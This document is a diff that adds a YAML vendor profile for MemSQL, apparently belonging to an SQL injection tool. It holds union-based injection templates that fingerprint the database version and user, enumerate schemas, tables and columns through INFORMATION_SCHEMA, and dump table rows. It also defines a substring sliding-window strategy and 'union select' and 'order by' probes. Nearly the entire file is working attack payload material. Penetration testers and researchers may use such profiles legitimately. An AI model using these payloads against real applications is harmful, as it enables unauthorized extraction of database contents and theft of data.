@@ -1,0 +1,129 @@
+vendor: ""
+resource: 
+ info: |
+  concat(
+      concat_ws(
+          '${ENCLOSE_VALUE_SQL}',
+          version(),
+          database(),
+          user()
+      ),
+      '${TRAIL_SQL}'
+  )
+ schema: 
+  database: |
+   select concat(
+       ifnull(
+           group_concat(
+               '${ENCLOSE_VALUE_SQL}',
+               r,
+               '${SEPARATOR_QTE_SQL}',
+               q,
+               '${ENCLOSE_VALUE_SQL}'
+               separator '${SEPARATOR_CELL_SQL}'
+           ),
+           '${TRAIL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select
+           cast(SCHEMA_NAME as char) r,
+           cast(count(TABLE_NAME) as char) q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on s.SCHEMA_NAME = t.table_schema
+       group by r
+       {limit}
+   ) x
+  table: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}',
+           r,
+           '${SEPARATOR_QTE_SQL}',
+           q,
+           '${ENCLOSE_VALUE_SQL}'
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select
+           cast(TABLE_NAME as char) r,
+           cast(ifnull(table_rows, '0') as char) q
+       from information_schema.tables
+       where TABLE_SCHEMA = '${DATABASE}'
+       order by r
+       {limit}
+   ) x
+  column: |
+   select concat(
+       group_concat(
+           '${ENCLOSE_VALUE_SQL}',
+           n,
+           '${SEPARATOR_QTE_SQL}',
+           0,
+           '${ENCLOSE_VALUE_SQL}'
+           separator '${SEPARATOR_CELL_SQL}'
+       ),
+       '${TRAIL_SQL}'
+   ) from (
+       select cast(COLUMN_NAME as char) n
+       from information_schema.columns
+       where TABLE_SCHEMA = '${DATABASE}'
+       and TABLE_NAME = '${TABLE}'
+       order by n
+       {limit}
+   ) x
+  row: 
+   query: |
+    select concat(
+        group_concat(
+            '${ENCLOSE_VALUE_SQL}',
+            r,
+            '${SEPARATOR_QTE_SQL}',
+            q,
+            '${ENCLOSE_VALUE_SQL}'
+            separator '${SEPARATOR_CELL_SQL}'
+        ),
+        '${TRAIL_SQL}'
+    ) from (
+        select
+            cast(concat(${FIELDS}) as char) r,
+            cast(count(*) as char) q
+        from `${DATABASE}`.`${TABLE}`
+        group by r
+        {limit}
+    ) x
+   fields: 
+    field: "trim(ifnull(`${FIELD}`, ''))"
+    concat: ",0x7f,"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   concat(
+       '${LEAD}',
+       substr(
+           (${INJECTION}),
+           ${INDEX},
+           ${CAPACITY}
+       )
+   )
+  limit: "limit ${LIMIT}, 65536"
+  failsafe: "1337${INDICE}7330%2b1"
+  calibrator: "rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')"
+  limitBoundary: 0
+  endingComment: ""
+  fingerprint: 
+   errorMessage: 
+    - memsql
+ normal: 
+  indices: "union select ${INDICES}"
+  capacity: |
+   (
+       select concat(
+           '${LEAD}', 
+           ${INDICE}, 
+           ${CALIBRATOR}
+       )
+   )
+  orderBy: "order by 1337"
